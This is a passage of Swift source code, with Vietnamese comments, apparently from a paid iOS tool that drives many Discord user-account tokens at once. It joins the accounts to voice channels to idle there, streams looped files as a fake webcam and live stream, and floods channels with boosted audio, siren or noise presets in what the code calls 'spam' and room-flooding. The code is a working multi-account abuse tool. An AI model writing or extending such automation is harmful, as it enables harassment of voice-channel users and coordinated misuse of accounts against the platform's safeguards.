                        Task { @MainActor [weak self] in
                            guard let self = self else { return }
                            if forStream {
                                if self.streamMedia?.id == targetId { self.streamCacheStatus = st }
                            } else {
                                if self.camMedia?.id == targetId { self.camCacheStatus = st }
                            }
                        }
                    },
                    onLog: { [weak self] msg in
                        Task { @MainActor [weak self] in
                            self?.addLog(msg)
                        }
                    }
                )
                if forStream {
                    self.streamCacheListener = (sess, lid)
                } else {
                    self.camCacheListener = (sess, lid)
                }
                sess.startOrResumePreparation()
            }
        }
    }

    func loadVoiceChannels(guild: Guild, token: String) async {
        selectedGuild = guild
        selectedChannel = nil
        isLoadingChannels = true
        voiceChannels = []
        guard await LicenseManager.shared.authorizeFeature(.voice) else {
            addLog("❌ Xác thực key chức năng Voice thất bại")
            isLoadingChannels = false
            return
        }
        do {
            let all: [Channel] = try await UserNukeClient(token: token, scope: .voice).getChannels(guild.id)
            let vcs = all.filter { $0.type == 2 || $0.type == 13 }.sorted { ($0.position ?? 0) < ($1.position ?? 0) }
            self.voiceChannels = vcs
            if let first = vcs.first {
                self.selectedChannel = first
                self.targetChannelId = first.id
            }
        } catch {
            addLog("Lỗi lấy danh sách Voice: \(error.localizedDescription)")
        }
        isLoadingChannels = false
    }

    // MARK: - MEDIA PICKER CHO GO LIVE STREAM & FAKE CAM (HỖ TRỢ MP4/MOV/MP3/M4A/WAV)
    func pickMediaFile(url: URL, forStream: Bool) {
        let accessed = url.startAccessingSecurityScopedResource()
        defer {
            if accessed { url.stopAccessingSecurityScopedResource() }
        }

        let fm = FileManager.default
        let cacheDir = fm.urls(for: .cachesDirectory, in: .userDomainMask).first?.appendingPathComponent("TreoMedia", isDirectory: true)
        if let dir = cacheDir {
            try? fm.createDirectory(at: dir, withIntermediateDirectories: true)
        }

        var finalURL = url
        if let dir = cacheDir {
            let safeName = "\(UUID().uuidString.prefix(8))_\(url.lastPathComponent)"
            let dest = dir.appendingPathComponent(safeName)
            if (try? fm.copyItem(at: url, to: dest)) != nil {
                finalURL = dest
            }
        }

        let ext = finalURL.pathExtension.lowercased()
        let audioExts: Set<String> = ["mp3", "m4a", "wav", "flac", "aac", "ogg", "caf"]
        let asset = AVURLAsset(url: finalURL)
        let hasVideoTrack = !asset.tracks(withMediaType: .video).isEmpty
        let isAudioOnly = audioExts.contains(ext) || !hasVideoTrack

        let source = TreoMediaSource(
            id: UUID(),
            title: url.lastPathComponent,
            url: finalURL,
            isAudioOnly: isAudioOnly,
            isVirtualPattern: false
        )

        if forStream {
            self.streamMedia = source
            self.isStreamEnabled = true
            addLog("📺 Đã nạp file Stream: \(source.title)\(isAudioOnly ? " (Audio → Màn đen)" : "")")
            prepareBackgroundCache(forStream: true)
            if isRunning { reconcileStream() }
        } else {
            self.camMedia = source
            self.isCamEnabled = true
            self.selfVideo = true
            addLog("🎥 Đã nạp file Fake Cam: \(source.title)\(isAudioOnly ? " (Audio → Màn đen)" : "")")
            prepareBackgroundCache(forStream: false)
            if isRunning { reconcileCam() }
        }
    }

    func selectVirtualMedia(_ source: TreoMediaSource, forStream: Bool) {
        if forStream {
            self.streamMedia = source
            self.isStreamEnabled = true
            prepareBackgroundCache(forStream: true)
            addLog("📺 Đã chọn Stream mẫu: \(source.title)")
            if isRunning { reconcileStream() }
        } else {
            self.camMedia = source
            self.isCamEnabled = true
            self.selfVideo = true
            prepareBackgroundCache(forStream: false)
            addLog("🎥 Đã chọn Fake Cam mẫu: \(source.title)")
            if isRunning { reconcileCam() }
        }
    }

    func setStreamEnabled(_ enabled: Bool) {
        if enabled && streamMedia == nil {
            streamMedia = .virtualCamPattern
        }
        isStreamEnabled = enabled
        if isRunning {
            reconcileStream()
        }
    }

    func clearStreamMedia() {
        isStreamEnabled = false
        streamMedia = nil
        prepareBackgroundCache(forStream: true)
        if isRunning {
            reconcileStream()
        }
    }

    func setCamEnabled(_ enabled: Bool) {
        if enabled && camMedia == nil {
            camMedia = .virtualCamPattern
        }
        isCamEnabled = enabled
        selfVideo = enabled
        if isRunning {
            reconcileCam()
        }
    }

    func clearCamMedia() {
        isCamEnabled = false
        selfVideo = false
        camMedia = nil
        prepareBackgroundCache(forStream: false)
        if isRunning {
            reconcileCam()
        }
    }

    func updateQualityMode(_ mode: TreoVideoQualityMode) {
        self.videoQualityMode = mode
        prepareBackgroundCache(forStream: true)
        prepareBackgroundCache(forStream: false)
        if isRunning {
            if isStreamEnabled { reconcileStream() }
            if isCamEnabled { reconcileCam() }
        }
    }

    func reconcileStream() {
        goLiveEngine.stop()
        guard isRunning, isStreamEnabled, let media = streamMedia else {
            for s in sessions {
                s.stopGoLive()
            }
            syncVoiceNowPlaying()
            return
        }

        let prof = activeProfile
        prepareBackgroundCache(forStream: true)
        syncVoiceNowPlaying()
        addLog("▶ GO LIVE (\(prof.label) • Loop ∞): \(media.title)")
        for s in sessions {
            s.startGoLive(profile: prof)
        }

        let activeList = sessions
        goLiveEngine.start(
            source: media,
            profile: prof,
            includeAudio: true,
            onVideoFrame: { annexB, frametimeMs in
                for s in activeList where s.isGoLiveActive {
                    s.sendGoLiveVideoFrame(annexB, frametimeMs: frametimeMs)
                }
            },
            onAudioFrame: { opus in
                for s in activeList where s.isGoLiveActive {
                    s.sendGoLiveAudioPacket(opus)
                }
            },
            onLog: { [weak self] msg in
                DispatchQueue.main.async { self?.addLog(msg) }
            }
        )
    }

    func reconcileCam() {
        fakeCamEngine.stop()
        guard isRunning, isCamEnabled, let media = camMedia else {
            self.selfVideo = false
            for s in sessions {
                s.setFakeCam(enabled: false, profile: nil)
            }
            syncVoiceNowPlaying()
            return
        }

        self.selfVideo = true
        let baseProf = activeProfile
        let camProf = camProfile(from: baseProf)
        prepareBackgroundCache(forStream: false)
        syncVoiceNowPlaying()

        addLog("▶ FAKE CAM (\(camProf.label) • Loop ∞): \(media.title)")
        for s in sessions {
            s.setFakeCam(enabled: true, profile: camProf)
        }

        let activeList = sessions
        fakeCamEngine.start(
            source: media,
            profile: camProf,
            includeAudio: false,
            onVideoFrame: { annexB, frametimeMs in
                for s in activeList where s.isFakeCamActive {
                    s.sendCamVideoFrame(annexB, frametimeMs: frametimeMs)
                }
            },
            onAudioFrame: nil,
            onLog: { [weak self] msg in
                DispatchQueue.main.async { self?.addLog(msg) }
            }
        )
    }

    func startTreo(guildId: String, channelId: String, channelName: String, tokens: [TokenInfo]) {
        guard !tokens.isEmpty else {
            addLog("Không có token nào được chọn")
            return
        }

        stopTreo()

        isRunning = true
        elapsedSeconds = 0
        activeChannelName = channelName
        logs = []

        addLog("Bắt đầu treo room [\(channelName)] (\(tokens.count) tài khoản)")

        BackgroundManager.shared.start(tag: "treo")
        NowPlayingHelper.shared.registerSession(
            NowPlayingSessionState(
                feature: .treoVoice,
                title: "Treo Voice • \(channelName)",
                detail: "0/\(tokens.count) token • Đang vào phòng...",
                controlsHint: "⏸ Tắt/Mở Mic • ◀◀ Cam • ▶▶ Go Live",
                isPaused: selfMute,
                elapsedTime: 0,
                duration: 0,
                isLiveStream: true,
                onPlay: { [weak self] in
                    guard let self = self else { return }
                    self.updateToggles(mute: false, deaf: self.selfDeaf, video: self.selfVideo)
                },
                onPause: { [weak self] in
                    guard let self = self else { return }
                    self.updateToggles(mute: true, deaf: self.selfDeaf, video: self.selfVideo)
                },
                onStop: { [weak self] in self?.stopTreo() },
                onNext: { [weak self] in
                    guard let self = self else { return }
                    self.setStreamEnabled(!self.isStreamEnabled)
                },
                onPrevious: { [weak self] in
                    guard let self = self else { return }
                    self.setCamEnabled(!self.isCamEnabled)
                }
            ),
            focus: true
        )

        var newSessions = [VoiceGatewaySession]()
        for t in tokens {
            let session = VoiceGatewaySession(tokenInfo: t)
            session.onLog = { [weak self] msg in
                self?.addLog(msg)
            }
            session.onVoiceUDPReady = { [weak self] in
                Task { @MainActor [weak self] in
                    guard let self = self, self.isRunning else { return }
                    if self.isCamEnabled {
                        self.fakeCamEngine.requestKeyFrame()
                    }
                }
            }
            session.onGoLiveReady = { [weak self] in
                Task { @MainActor [weak self] in
                    guard let self = self, self.isRunning else { return }
                    self.goLiveEngine.requestKeyFrame()
                }
            }
            session.onRequestCamKeyFrame = { [weak self] in
                self?.fakeCamEngine.requestKeyFrame()
            }
            session.onRequestGoLiveKeyFrame = { [weak self] in
                self?.goLiveEngine.requestKeyFrame()
            }
            newSessions.append(session)
        }
        self.sessions = newSessions

        let initialCamOn = self.isCamEnabled && self.camMedia != nil
        let initialStreamOn = self.isStreamEnabled && self.streamMedia != nil
        let initialMute = self.selfMute
        let initialDeaf = self.selfDeaf

        if initialStreamOn {
            self.reconcileStream()
        }
        if initialCamOn {
            self.reconcileCam()
        }

        // Nối lần lượt từng token cách nhau 300ms sau khi xác thực key chức năng Voice với server CLF
        joinTask?.cancel()
        joinTask = Task { @MainActor [weak self] in
            guard let self = self else { return }
            let authorized = await LicenseManager.shared.authorizeFeature(.voice)
            guard authorized else {
                self.addLog("❌ Xác thực bản quyền chức năng Treo Voice thất bại")
                self.stopTreo()
                return
            }
            for (idx, session) in newSessions.enumerated() {
                if Task.isCancelled || !self.isRunning { break }
                session.start(
                    guildId: guildId,
                    channelId: channelId,
                    mute: initialMute,
                    deaf: initialDeaf,
                    video: self.isCamEnabled && self.camMedia != nil,
                    enableVideo: true
                )
                if idx + 1 < newSessions.count {
                    try? await Task.sleep(nanoseconds: 300_000_000)
                }
            }
        }

        timer?.invalidate()
        timer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { [weak self] _ in
            Task { @MainActor [weak self] in
                guard let self = self, self.isRunning else { return }
                self.elapsedSeconds += 1
                if self.elapsedSeconds % 2 == 0 {
                    self.syncVoiceNowPlaying()
                }
            }
        }
    }

    func syncVoiceNowPlaying() {
        guard isRunning else { return }
        let joinedCount = sessions.filter { $0.isJoined }.count
        var flags: [String] = []
        if isStreamEnabled { flags.append("LIVE") }
        if isCamEnabled { flags.append("CAM") }
        if selfMute { flags.append("MUTE") }
        let badgeStr = flags.isEmpty ? "" : " • " + flags.joined(separator: "/")
        NowPlayingHelper.shared.updateSession(
            .treoVoice,
            title: "Treo Voice • \(activeChannelName)",
            detail: "\(joinedCount)/\(sessions.count) token • \(formatDuration(elapsedSeconds))\(badgeStr)",
            isPaused: selfMute,
            elapsedTime: Double(elapsedSeconds),
            duration: 0,
            isLiveStream: true
        )
    }

    func setAppInBackground(_ inBackground: Bool) {
        H264FullVideoCacheManager.shared.setAppInBackground(inBackground)
        goLiveEngine.setBackgroundMode(inBackground)
        fakeCamEngine.setBackgroundMode(inBackground)
        if inBackground && isRunning {
            BackgroundManager.shared.start(tag: "treo")
        } else if !inBackground && isRunning {
            goLiveEngine.requestKeyFrame()
            fakeCamEngine.requestKeyFrame()
        }
    }

    func stopTreo() {
        joinTask?.cancel()
        joinTask = nil
        goLiveEngine.stop()
        fakeCamEngine.stop()
        timer?.invalidate()
        timer = nil

        for s in sessions {
            s.stop()
        }
        sessions.removeAll()
        isRunning = false
        NowPlayingHelper.shared.endSession(.treoVoice)
        BackgroundManager.shared.stop(tag: "treo")
        addLog("Đã dừng treo room, Fake Cam và Go Live.")
    }

    func updateToggles(mute: Bool, deaf: Bool, video: Bool) {
        self.selfMute = mute
        self.selfDeaf = deaf
        self.selfVideo = video
        for s in sessions {
            s.updateToggles(mute: mute, deaf: deaf, video: video)
        }
        syncVoiceNowPlaying()
    }

    func setSpeaking(_ speaking: Bool) {
        for s in sessions {
            s.setSpeaking(speaking)
        }
    }

    func broadcastOpusPacket(_ opusData: Data) {
        for s in sessions {
            s.sendOpusPacket(opusData)
        }
    }

    func addLog(_ msg: String) {
        let entry = VoiceLogEntry(timestamp: Date(), message: msg)
        logs.insert(entry, at: 0)
        if logs.count > 100 { logs.removeLast() }
    }

    func formatDuration(_ s: Int) -> String {
        let h = s / 3600
        let m = (s % 3600) / 60
        let sec = s % 60
        if h > 0 {
            return String(format: "%02d:%02d:%02d", h, m, sec)
        }
        return String(format: "%02d:%02d", m, sec)
    }
}

// ==============================================================================
// MARK: - MUSIC STREAM MANAGER (HỆ THỐNG TIÊN NGHỊCH [XẢ CHA - ĐỘC TÔN] - MAKE SUPER VIP)
// ==============================================================================
@MainActor
final class MusicStreamManager: NSObject, ObservableObject, AVAudioPlayerDelegate {
    static let shared = MusicStreamManager()

    @Published var isPlaying = false
    @Published var isPaused = false
    @Published var statusText = "⛩️ Bế quan (Chưa hoạt động)"
    @Published var logs: [VoiceRoomLog] = []

    // Trận pháp Đạo Hữu (Đa Token / 1 Token)
    @Published var multiTokenMode: Bool = true // Mặc định chạy cả dàn token như Make Super VIP
    @Published var selectedToken: TokenInfo? = nil
    @Published var customToken: String = ""
    @Published var targetChannelId: String = ""
    @Published var selectedGuild: Guild? = nil
    @Published var selectedChannel: Channel? = nil

    // Linh Hồn Hàng Đợi (Playlist Queue)
    @Published var playlist: [PlaylistItem] = []
    @Published var currentTrackIndex: Int = 0
    @Published var currentSongTitle = "Chưa nạp pháp bảo nhạc"
    @Published var audioFileURL: URL? = nil
    @Published var currentTime: Double = 0
    @Published var duration: Double = 0
    @Published var visualizerLevels: [CGFloat] = [0.2, 0.4, 0.7, 0.3, 0.9, 0.5, 0.8, 0.4]

    // Cấu hình âm thanh & Sát chiêu chiến đấu Make Super VIP
    @Published var volume: Float = 1.0 { // Chân hỏa: 0.0 to 2.0 (0% - 200%)
        didSet { localPlayer?.volume = min(1.0, volume) }
    }
    @Published var boostMultiplier: Float = 1.0 // Ép xung: 1.0 to 5.0 (100% - 500%)
    @Published var bassAmount: Float = 0.0 // Trọng lực Bass: 0 to 100
    @Published var isCleanMode: Bool = false // !xoatapam: Lọc ồn chủ động (Highpass 150Hz + Lowpass 10kHz)
    @Published var isMaxMode: Bool = false // !max: Sát chiêu V9 Tối Thượng (EQ 80Hz + 3500Hz + Boost 2.5x)
    @Published var playbackSpeed: Float = 1.0 // Tốc độ phát: 0.75, 1.0, 1.25, 1.5
    @Published var audioFX: SpamAudioFX = .normal
    @Published var loopMode: PlaylistLoopMode = .loopAll // Vòng lặp vô hạn
    @Published var playLocalSpeaker: Bool = false // Loa ngoài (Mặc định tắt)

    // Dàn phiên âm thanh (Đa phân thân)
    @Published var activeSessions: [VoiceGatewaySession] = []
    private var streamTask: Task<Void, Never>?
    var currentDecoder: AudioTrackDecoder?
    private var streamFrameIndex = 0
    private var localPlayer: AVAudioPlayer?

    // DSP Filter States
    private var bassStateL: Float = 0
    private var bassStateR: Float = 0
    private var hpStateL: Float = 0
    private var hpStateR: Float = 0
    private var prevInL: Float = 0
    private var prevInR: Float = 0
    private var lpStateL: Float = 0
    private var lpStateR: Float = 0

    private override init() {
        super.init()
    }

    var currentTrack: PlaylistItem? {
        guard currentTrackIndex >= 0 && currentTrackIndex < playlist.count else { return nil }
        return playlist[currentTrackIndex]
    }

    func addLog(_ msg: String) {
        let log = VoiceLogEntry(id: UUID(), timestamp: Date(), message: msg)
        logs.append(log)
        if logs.count > 100 { logs.removeFirst(logs.count - 100) }
    }

    // MARK: - PLAYLIST QUEUE MANAGEMENT
    func addFiles(urls: [URL]) {
        let fm = FileManager.default
        let cacheDir = fm.urls(for: .cachesDirectory, in: .userDomainMask).first?.appendingPathComponent("SpamAudio", isDirectory: true)
        if let dir = cacheDir {
            try? fm.createDirectory(at: dir, withIntermediateDirectories: true)
        }

        var addedCount = 0
        for url in urls {
            let accessed = url.startAccessingSecurityScopedResource()
            defer {
                if accessed { url.stopAccessingSecurityScopedResource() }
            }

            var finalURL = url
            if let dir = cacheDir {
                let safeName = "\(UUID().uuidString.prefix(8))_\(url.lastPathComponent)"
                let dest = dir.appendingPathComponent(safeName)
                if (try? fm.copyItem(at: url, to: dest)) != nil {
                    finalURL = dest
                }
            }

            let title = url.deletingPathExtension().lastPathComponent
            let asset = AVURLAsset(url: finalURL)
            let dur = CMTimeGetSeconds(asset.duration)
            let durationSeconds = (dur.isNaN || dur.isInfinite) ? 0 : dur
            let item = PlaylistItem(
                id: UUID(),
                title: title,
                url: finalURL,
                durationSeconds: durationSeconds,
                isPreset: false,
                preset: nil
            )
            playlist.append(item)
            addedCount += 1
        }
        addLog("📥 Đã nạp thêm \(addedCount) pháp bảo vào Linh Hồn Hàng Đợi (Tổng: \(playlist.count) bài)")
        statusText = "Đã có \(playlist.count) pháp bảo trong hàng đợi"

        if currentDecoder == nil && !playlist.isEmpty {
            selectTrack(index: 0)
        }
    }

    func addPreset(_ preset: MusicPreset) {
        let item = PlaylistItem(
            id: UUID(),
            title: preset.rawValue,
            url: nil,
            durationSeconds: 6.0,
            isPreset: true,
            preset: preset
        )
        playlist.append(item)
        addLog("📥 Đã nạp pháp bảo mẫu VIP: \(preset.rawValue)")
        if currentDecoder == nil {
            selectTrack(index: playlist.count - 1)
        }
    }

    func addAllPresets() {
        for p in MusicPreset.allCases {
            addPreset(p)
        }
    }

    func removeTrack(id: UUID) {
        if let idx = playlist.firstIndex(where: { $0.id == id }) {
            playlist.remove(at: idx)
            if playlist.isEmpty {
                stopSpam()
                currentDecoder = nil
                currentSongTitle = "Chưa nạp pháp bảo nhạc"
                audioFileURL = nil
                duration = 0
                currentTime = 0
                statusText = "Linh hồn hàng đợi đang trống rỗng"
            } else if currentTrackIndex >= playlist.count {
                selectTrack(index: playlist.count - 1)
            } else if currentTrackIndex == idx {
                selectTrack(index: currentTrackIndex)
            }
        }
    }

    func clearPlaylist() {
        stopSpam()
        playlist.removeAll()
        currentDecoder = nil
        currentSongTitle = "Chưa nạp pháp bảo nhạc"
        audioFileURL = nil
        duration = 0
        currentTime = 0
        statusText = "Đã giải tán toàn bộ hàng đợi nhạc"
        addLog("🗑️ Đã xóa sạch Linh Hồn Hàng Đợi")
    }

    func selectTrack(index: Int) {
        guard index >= 0 && index < playlist.count else { return }
        currentTrackIndex = index
        let item = playlist[index]
        currentSongTitle = item.title
        audioFileURL = item.url
        streamFrameIndex = 0
        currentTime = 0

        if item.isPreset, let preset = item.preset {
            generatePresetSamples(preset)
        } else if let url = item.url {
            loadDecoder(url: url)
        }
    }

    func playNext() {
        guard !playlist.isEmpty else { return }
        switch loopMode {
        case .loopOne:
            streamFrameIndex = 0
            currentTime = 0
            localPlayer?.currentTime = 0
        case .loopAll:
            let next = (currentTrackIndex + 1) % playlist.count
            selectTrack(index: next)
        case .shuffle:
            if playlist.count > 1 {
                var r = Int.random(in: 0..<playlist.count)
                if r == currentTrackIndex { r = (r + 1) % playlist.count }
                selectTrack(index: r)
            } else {
                streamFrameIndex = 0
                currentTime = 0
            }
        }
    }

    func playPrevious() {
        guard !playlist.isEmpty else { return }
        let prev = (currentTrackIndex - 1 + playlist.count) % playlist.count
        selectTrack(index: prev)
    }

    // MARK: - AUDIO DECODING
    private func loadDecoder(url: URL) {
        statusText = "Đang nạp: \(url.deletingPathExtension().lastPathComponent)..."
        Task.detached { [weak self] in
            guard let self = self else { return }
            if let decoder = AudioTrackDecoder(url: url) {
                await MainActor.run {
                    self.currentDecoder = decoder
                    self.duration = decoder.durationSeconds
                    self.currentTime = 0
                    self.statusText = self.isPlaying ? "🔥 Đang xả: \(self.currentSongTitle)" : "Đã sẵn sàng: \(self.currentSongTitle)"
                    if self.isPlaying { self.syncMusicNowPlaying() }
                    if self.playLocalSpeaker {
                        self.setupLocalPlayer(url: url)
                        if self.isPlaying && !self.isPaused {
                            self.localPlayer?.play()
                        }
                    }
                }
            } else {
                await MainActor.run {
                    self.statusText = "❌ Lỗi định dạng pháp bảo không hỗ trợ"
                }
            }
        }
    }

    private func generatePresetSamples(_ preset: MusicPreset) {
        let sampleRate: Double = 48000.0
        let toneDuration: Double = 6.0
        let frameCount = Int(sampleRate * toneDuration)
        var left = [Float]()
        var right = [Float]()
        left.reserveCapacity(frameCount)
        right.reserveCapacity(frameCount)

        for i in 0..<frameCount {
            let t = Double(i) / sampleRate
            var sample: Float = 0
            switch preset {
            case .djVinahouse:
                let beat = fmod(t * (132.0 / 60.0), 1.0)
                let kick = beat < 0.15 ? sin(Float(2 * Double.pi * 55 * t) * (1.0 - Float(beat / 0.15))) : 0
                let lead = sin(Float(2 * Double.pi * 440 * t)) * 0.3
                sample = Float(kick * 0.7) + lead
            case .bassBoost:
                sample = sin(Float(2 * Double.pi * 50 * t)) * 0.8 + sin(Float(2 * Double.pi * 100 * t)) * 0.2
            case .loFi:
                sample = (sin(Float(2 * Double.pi * 261.6 * t)) + sin(Float(2 * Double.pi * 329.6 * t)) + sin(Float(2 * Double.pi * 392.0 * t))) * 0.25
            case .trollSiren:
                let freq = 750.0 + 200.0 * sin(2 * Double.pi * 2.0 * t)
                sample = sin(Float(2 * Double.pi * freq * t)) * 0.5
            case .whiteNoise:
                sample = Float.random(in: -0.2...0.2)
            }
            let clamped = max(-1.0, min(1.0, sample))
            left.append(clamped)
            right.append(clamped)
        }

        let decoder = AudioTrackDecoder(left: left, right: right, durationSeconds: toneDuration)
        self.currentDecoder = decoder
        self.duration = toneDuration
        self.currentTime = 0
        self.statusText = self.isPlaying ? "🔥 Đang xả: \(preset.rawValue)" : "Đã chọn: \(preset.rawValue)"
        if self.isPlaying { self.syncMusicNowPlaying() }
    }

    private func setupLocalPlayer(url: URL) {
        do {
            BackgroundManager.shared.applyAudioSessionCategory()

            localPlayer = try AVAudioPlayer(contentsOf: url)
            localPlayer?.delegate = self
            localPlayer?.numberOfLoops = (loopMode == .loopOne) ? -1 : 0
            localPlayer?.volume = min(1.0, volume)
            localPlayer?.prepareToPlay()
        } catch {}
    }

    // MARK: - BẮT ĐẦU XẢ ROOM TIÊN NGHỊCH (ĐA TOKEN ĐỒNG LOẠT MAKE SUPER VIP)
    func startSpam(app: AppState) {
        guard let decoder = currentDecoder, !decoder.leftSamples.isEmpty else {
            statusText = "❌ Chưa nạp pháp bảo nhạc vào hàng đợi"
            return
        }

        let inputCID = targetChannelId.trimmingCharacters(in: .whitespacesAndNewlines)
        let channelId = !inputCID.isEmpty ? inputCID : (selectedChannel?.id ?? "")
        guard !channelId.isEmpty else {
            statusText = "❌ Vui lòng nhập Channel ID hoặc chọn phòng xả"
            return
        }

        // Xác định danh sách Token tham chiến
        var tokensToUse: [TokenInfo] = []
        if multiTokenMode {
            if !app.selectedTokenIds.isEmpty {
                tokensToUse = app.tokens.filter { app.selectedTokenIds.contains($0.id) }
            } else if !app.tokens.isEmpty {
                tokensToUse = app.tokens
            }
        } else {
            if let st = selectedToken {
                tokensToUse = [st]
            } else if !customToken.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
                let t = customToken.trimmingCharacters(in: .whitespacesAndNewlines)
                tokensToUse = [TokenInfo(token: t, userId: "", username: "Custom Token", avatarHash: nil, isValid: true)]
            } else if let at = app.activeToken {
                tokensToUse = [at]
            } else if let f = app.tokens.first {
                tokensToUse = [f]
            }
        }

        guard !tokensToUse.isEmpty else {
            statusText = "❌ Chưa có Token nào sẵn sàng xuất thủ"
            return
        }

        stopSpam()

        isPlaying = true
        isPaused = false
        statusText = "⚡ Triệu tập \(tokensToUse.count) Đạo hữu xuất thủ..."
        streamFrameIndex = 0
        currentTime = 0
        addLog("⚡ Khởi động HỆ THỐNG TIÊN NGHỊCH: Triệu tập \(tokensToUse.count) Đạo hữu vào phòng [\(channelId)]")

        BackgroundManager.shared.start(tag: "music")
        NowPlayingHelper.shared.registerSession(
            NowPlayingSessionState(
                feature: .music,
                title: currentSongTitle,
                detail: "Xả Nhạc VIP • Triệu tập \(tokensToUse.count) token",
                controlsHint: "⏸ Câm/Sủa • ◀◀/▶▶ Chuyển bài • Kéo tua",
                isPaused: false,
                elapsedTime: 0,
                duration: duration,
                isLiveStream: duration <= 0,
                onPlay: { [weak self] in self?.resumeSpam() },
                onPause: { [weak self] in self?.pauseSpam() },
                onStop: { [weak self] in self?.stopSpam() },
                onNext: { [weak self] in self?.playNext() },
                onPrevious: { [weak self] in self?.playPrevious() },
                onSeek: { [weak self] sec in self?.seek(to: sec) }
            ),
            focus: true
        )

        Task { [weak self] in
            guard let self = self else { return }

            let authorized = await LicenseManager.shared.authorizeFeature(.music)
            guard authorized else {
                await MainActor.run {
                    self.statusText = "❌ Xác thực bản quyền chức năng Xả Nhạc thất bại"
                    self.addLog("❌ Server từ chối quyền sử dụng chức năng Xả Nhạc")
                    self.stopSpam()
                }
                return
            }

            var guildId = self.selectedGuild?.id
            if guildId == nil || guildId!.isEmpty {
                await MainActor.run { self.statusText = "Đang tra cứu Server của phòng \(channelId)..." }
                if let firstTok = tokensToUse.first?.token {
                    guildId = await fetchGuildIdForChannel(token: firstTok, channelId: channelId, scope: .music)
                }
            }

            guard let gid = guildId, !gid.isEmpty else {
                await MainActor.run {
                    self.statusText = "❌ Không tìm thấy Server (Kiểm tra Channel ID hoặc quyền token)"
                    self.addLog("❌ Không tra cứu được Guild ID cho phòng \(channelId)")
                    self.isPlaying = false
                }
                return
            }

            await MainActor.run {
                self.statusText = "Đang kết nối toàn bộ \(tokensToUse.count) phân thân vào Voice UDP..."
            }

            var createdSessions: [VoiceGatewaySession] = []
            for token in tokensToUse {
                let session = VoiceGatewaySession(tokenInfo: token, scope: .music)
                session.onLog = { [weak self] msg in
                    DispatchQueue.main.async {
                        self?.addLog(msg)
                    }
                }
                session.start(
                    guildId: gid,
                    channelId: channelId,
                    mute: false,
                    deaf: false,
                    video: false
                )
                createdSessions.append(session)
            }

            await MainActor.run {
                self.activeSessions = createdSessions
            }

            var waited = 0
            while waited < 50 && self.isPlaying {
                let readyCount = createdSessions.filter { $0.isVoiceUDPReady }.count
                if readyCount > 0 && (readyCount == createdSessions.count || waited > 15) {
                    break
                }
                try? await Task.sleep(nanoseconds: 500_000_000)
                waited += 1
            }

            let readySessions = createdSessions.filter { $0.isVoiceUDPReady }
            guard !readySessions.isEmpty && self.isPlaying else {
                await MainActor.run {
                    if self.isPlaying {
                        self.statusText = "❌ Kết nối Voice thất bại (Hết thời gian chờ UDP)"
                        self.addLog("❌ Không thể thiết lập kênh UDP cho các phân thân")
                        self.stopSpam()
                    }
                }
                return
            }

            await MainActor.run {
                self.statusText = "🔥 Đang xả hỏa lực: \(self.currentSongTitle) (\(readySessions.count) Đạo hữu)"
                self.addLog("🔥 Trận pháp đã kết thành! \(readySessions.count)/\(createdSessions.count) phân thân bắt đầu xả nhạc đồng loạt!")

                let silence = Data([0xF8, 0xFF, 0xFE])
                for s in readySessions {
                    s.setSpeaking(true)
                    // Gửi 5 gói im lặng mở luồng SSRC để Discord kích hoạt bộ giải mã thoại ngay lập tức
                    for _ in 0..<5 {
                        s.sendOpusPacket(silence)
                    }
                }

                if self.playLocalSpeaker, let url = self.audioFileURL {
                    self.setupLocalPlayer(url: url)
                    self.localPlayer?.play()
                }

                self.syncMusicNowPlaying()
                self.startStreamingTask()
            }
        }
    }

    func syncMusicNowPlaying() {
        guard isPlaying else { return }
        let readyCount = activeSessions.filter { $0.isVoiceUDPReady }.count
        let countLabel = readyCount > 0 ? "\(readyCount) phân thân" : "Đang kết nối..."
        NowPlayingHelper.shared.updateSession(
            .music,
            title: currentSongTitle,
            detail: "Xả Nhạc VIP • \(countLabel) • \(audioFX.rawValue)",
            isPaused: isPaused,
            elapsedTime: currentTime,
            duration: duration,
            isLiveStream: duration <= 0
        )
    }

    // MARK: - SÁT CHIÊU CÂM MỒM (!cam) & SỦA TIẾP (!sua)
    func pauseSpam() {
        guard isPlaying else { return }
        isPaused = true
        for s in activeSessions {
            s.setSpeaking(false)
        }
        localPlayer?.pause()
        statusText = "🔇 Đã phong ấn âm thanh (Câm mồm)"
        addLog("🔇 Đã phong ấn âm thanh (Câm mồm). Giữ nguyên toàn bộ phân thân trong phòng.")
        syncMusicNowPlaying()
    }

    func resumeSpam() {
        guard isPlaying else { return }
        isPaused = false
        for s in activeSessions where s.isVoiceUDPReady {
            s.setSpeaking(true)
        }
        localPlayer?.play()
        statusText = "🔊 Đã giải ấn! Tiếp tục xả hỏa lực"
        addLog("🔊 Đã giải ấn! Tiếp tục xả hỏa lực y như lúc ban đầu.")
        syncMusicNowPlaying()
    }

    // MARK: - BẾ QUAN / THU HỒI PHÂN THÂN (!exit)
    func stop() {
        stopSpam()
    }

    func stopSpam() {
        isPlaying = false
        isPaused = false
        streamTask?.cancel()
        streamTask = nil

        let silence = Data([0xF8, 0xFF, 0xFE])
        for session in activeSessions {
            for _ in 0..<5 {
                session.sendOpusPacket(silence)
            }
            session.setSpeaking(false)
            session.stop()
        }
        activeSessions.removeAll()

        localPlayer?.stop()
        localPlayer = nil

        NowPlayingHelper.shared.endSession(.music)
        BackgroundManager.shared.stop(tag: "music")

        statusText = "⛩️ Bế quan (Đã thu hồi toàn bộ phân thân)"
        addLog("⛩️ Đã bế quan, giải tán hàng đợi nhạc và thu hồi toàn bộ phân thân.")
        currentTime = 0
        streamFrameIndex = 0
    }

    func seek(to seconds: Double) {
        guard let decoder = currentDecoder, decoder.durationSeconds > 0 else { return }
        let fraction = min(1.0, max(0.0, seconds / decoder.durationSeconds))
        streamFrameIndex = Int(Double(decoder.totalFrames) * fraction)
        currentTime = seconds
        localPlayer?.currentTime = seconds
        if isPlaying { syncMusicNowPlaying() }
    }

    // MARK: - STREAMING ENGINE ĐA PHÂN THÂN MAKE SUPER VIP
    private func startStreamingTask() {
        streamTask?.cancel()

        streamTask = Task.detached { [weak self] in
            guard let self = self else { return }
            var speedAccumulator: Float = 0
            guard let encoder = NativeOpusEncoder() else {
                await MainActor.run {
                    self.addLog("❌ Lỗi nghiêm trọng: Không thể khởi tạo bộ mã hóa Opus!")
                    self.statusText = "❌ Lỗi bộ mã hóa Opus"
                }
                return
            }

            var hpStateL: Float = 0
            var hpStateR: Float = 0
            var prevInL: Float = 0
            var prevInR: Float = 0
            var lpStateL: Float = 0
